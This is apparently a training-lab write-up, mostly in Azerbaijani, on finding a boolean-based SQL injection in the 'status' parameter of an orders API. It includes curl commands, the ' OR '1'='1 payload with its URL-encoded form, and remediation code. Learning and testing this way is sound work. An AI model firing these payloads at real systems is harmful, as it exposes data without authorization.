# SQL Injection Task 0 - Manual Discovery Writeup

## 🎯 Məqsəd
Web aplikasiyada SQL Injection zəifliyi olan parametrləri manual olaraq tapmaq.

---

## 🔍 Methodology

### 1️⃣ İlk Reconnaissance

**Səhifəyə keçid:**
```bash
curl http://web0x01.hbtn/a3/sql_injection/
```

**Nəticə:** JavaScript-based Single Page Application (SPA)

**HTML analizi:** Səhifə `a3_sql_injection.js` faylını yükləyir.

---

### 2️⃣ JavaScript Faylını Analiz

```bash
curl -s "http://web0x01.hbtn/static/tasks/a3_sql_injection.js" > /tmp/sql_injection.js
wc -l /tmp/sql_injection.js
# Nəticə: 33 sətir, amma 99.8 KB (minified)
```

**API Endpoint-lərini tap:**
```bash
grep -oE '"/api/[^"]+"|fetch\([^)]+\)' /tmp/sql_injection.js
```

**Tapılan endpoint-lər:**
- `/api/a3/sql_injection/all_orders`
- `/api/a3/sql_injection/all_customers`

**URL parametrlərini tap:**
```bash
grep -oE '\?[a-zA-Z_]+=' /tmp/sql_injection.js | sort -u
```

**Potensial parametrlər:**
- `?status=`
- `?customer=`
- `?search=`

---

### 3️⃣ Endpoint-ləri Test Et

#### Test 1: all_orders endpoint (parametrsiz)
```bash
curl -s "http://web0x01.hbtn/api/a3/sql_injection/all_orders"
```

**Nəticə:** 24 sifariş qaytarır (bütün məlumat)

---

#### Test 2: status parametri
```bash
curl -s "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid"
```

**Nəticə:** Yalnız 4 "Paid" statuslu sifariş. ✅ Parameter işləyir!

---

### 4️⃣ SQL Injection Test

#### Test 1: Single Quote (Syntax Error)
```bash
curl -s "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid'"
```

**Nəticə:** Boş array `[]` - SQL xətası baş verdi!

---

#### Test 2: Boolean-based Injection
```bash
curl -s "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid%27%20OR%20%271%27%3D%271"
# URL decoded: status=Paid' OR '1'='1
```

**Nəticə:** 24 sifariş (BÜTÜN məlumat bazası) ✅ **VULNERABLE!**

**Müqayisə:**
- Normal: `status=Paid` → 4 nəticə
- Injection: `status=Paid' OR '1'='1` → 24 nəticə

---

### 5️⃣ Digər Parametrləri Yoxla

#### customer parametri:
```bash
curl -s "http://web0x01.hbtn/api/a3/sql_injection/all_customers?customer=Yosri%27%20OR%20%271%27%3D%271"
```
**Nəticə:** Eyni cavab (parametrsiz halda da eyni). ❌ Qorunan

---

#### search parametri:
```bash
curl -s "http://web0x01.hbtn/api/a3/sql_injection/all_orders?search=Yosri%27%20OR%20%271%27%3D%271"
```
**Nəticə:** Boş array. ❌ Qorunan

---

## 📊 Vulnerability Confirmation

### Tapılan Zəiflik:
- **Parameter:** `status`
- **Endpoint:** `/api/a3/sql_injection/all_orders`
- **Attack Type:** Boolean-based SQL Injection

### Proof of Concept:

```bash
# Normal query - yalnız 4 "Paid" sifariş
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid"

# SQL Injection - BÜTÜN 24 sifariş
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid' OR '1'='1"
```

### Backend SQL Query (təxmin):
```sql
-- Normal
SELECT * FROM orders WHERE status = 'Paid';  -- 4 rows

-- Injected
SELECT * FROM orders WHERE status = 'Paid' OR '1'='1';  -- 24 rows
```

---

## ✅ Nəticə

**Zəif parametr:** `status`

```bash
echo "status" > 0-vuln.txt
```

---

## 🎓 İstifadə Olunan Texnikalar

### 1. JavaScript Analysis
- Minified kodda API endpoint-lər axtarışı
- `grep` ilə pattern matching
- URL parametrlərinin identifikasiyası

### 2. Manual Parameter Testing
- Hər parametri ayrı-ayrılıqda test etmək
- Normal və injected cavabları müqayisə etmək

### 3. SQL Injection Payloads
- Single quote (`'`) - syntax error
- `' OR '1'='1` - boolean bypass
- URL encoding: `%27%20OR%20%271%27%3D%271`

### 4. REST API Testing
- cURL ilə HTTP GET requests
- Response data analizi
- Nəticə saylarının müqayisəsi

---

## 🔐 Security Impact

**Vulnerability Class:** A03:2021 - Injection (OWASP Top 10)

**Risk Level:** HIGH

**Impact:**
1. ✅ **Data Exposure** - Bütün sifarişlərə icazəsiz giriş
2. ⚠️ **Potential Escalation:**
   - UNION SELECT ilə database structure
   - UPDATE/DELETE əməliyyatları
   - Credential theft (user table varsa)

---

## 💡 Remediation

1. **Parametrize edilmiş sorğular:**
   ```python
   cursor.execute("SELECT * FROM orders WHERE status = ?", (status,))
   ```

2. **Input whitelist:**
   ```python
   ALLOWED_STATUSES = ['Paid', 'Pending', 'Refunded', 'Cancelled']
   if status not in ALLOWED_STATUSES:
       return error
   ```

3. **ORM istifadəsi:**
   ```python
   Order.objects.filter(status=status)  # Django ORM
   ```

---

**Author:** Sade  
**Date:** 19 Yanvar 2026  
**Method:** 100% Manual Testing (No GitHub OSINT)  
**Time:** ~45 dəqiqə  
**Difficulty:** Easy
